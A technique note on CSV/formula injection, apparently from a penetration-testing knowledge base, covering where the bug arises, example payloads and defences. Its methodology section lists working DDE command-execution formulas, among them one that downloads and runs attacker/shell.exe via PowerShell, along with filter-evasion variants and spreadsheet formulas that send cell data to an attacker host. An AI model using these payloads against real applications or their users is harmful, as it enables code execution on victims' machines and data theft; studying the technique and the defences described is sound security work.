---
title: "CSV Injection"
type: technique
tags: [client-side, dde, formula-injection, exploitation, web]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-06-16
sources: [payloadsallthethings-csv]
---

# CSV Injection

## What it is

CSV / Formula Injection: an app exports unsanitized user input into a CSV (or XLSX), and when a victim opens it in Excel/LibreOffice/Sheets, a cell beginning with a formula character executes - DDE/command execution on the victim's machine or data exfiltration. The impact lands on whoever downloads the export (often an admin). Client-side, stored-style.

## How it works / where found
Any "export to CSV/Excel" feature fed by user-controlled fields: usernames, addresses, feedback, support tickets, profile fields, log exports. A cell is treated as a formula if it starts with `= + - @` (or tab/CR before them).

## Methodology
### Formula / DDE command execution (Excel)
```text
=cmd|'/C calc'!A0
=cmd|'/C powershell IEX(wget http://attacker/shell.exe)'!A0
@SUM(1+1)*cmd|'/C calc'!A0
=rundll32|'URL.dll,OpenURL calc.exe'!A
```
### Evasion (filter bypass)
```text
=AAAA+BBBB-CCCC&"x"/1&cmd|'/c calc.exe'!A      # prefix + chaining
=    C    m D    |  '/ c  c a l c . e x e' ! A # spaces/null chars to dodge string filters
```
### Exfiltration (Google Sheets / hyperlinks)
```text
=IMPORTXML("http://attacker/?x", "//a/@href")
=HYPERLINK("http://attacker/?leak="&A1,"click")
=IMPORTDATA("http://attacker/?"&CONCAT(A1:A9))
```
`IMPORTXML/RANGE/HTML/FEED/DATA` fetch external URLs (Sheets warns the user first; Excel DDE may prompt too, but users click through).

## Real-world
A perennial bug-bounty finding on any app with CSV/Excel export; impact is RCE on the (often privileged) user who opens the report, or silent data exfil via formula fetches.

## Detection and defence
Prefix any cell starting with `= + - @` (or tab/CR/`|`/`%`) with a single quote `'` or a leading space, or wrap in quotes and escape; better, set the export `Content-Type`/extension so it is not auto-opened as a live sheet; validate/strip formula leaders server-side at export time (RFC 4180 quoting alone does NOT stop formula execution). Disable DDE in Excel via policy.

## Tools
Manual payloads + a spreadsheet app to verify; Burp to seed the field that lands in the export.

## Sources
- PayloadsAllTheThings - CSV Injection
